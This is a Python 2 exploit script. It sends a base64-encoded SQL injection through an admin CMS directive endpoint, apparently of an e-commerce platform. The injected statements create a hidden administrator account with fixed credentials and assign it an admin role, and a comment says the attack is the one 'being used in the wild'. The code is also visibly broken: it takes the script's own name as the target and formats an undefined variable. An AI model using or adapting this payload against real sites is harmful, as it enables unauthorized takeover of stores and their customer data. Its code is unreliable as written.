import requests
import base64
import sys

target = sys.argv[0]

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/index.php/admin/Cms_Wysiwyg/directive/index/"

# For demo purposes, I use the same attack as is being used in the wild
query="""
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

query = SQLQUERY.replace("\n", "").format(username="ypwq", password="123")

pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
r = requests.post(target_url, 
                  data={"___directive": base64.b64encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}"),
                                    "filter": base64.b64encode(pfilter),
                                    "forwarded": 1})
if r.ok:
    print "WORKED"
    print "Check {0}/admin with creds ypwq:123".format(target)
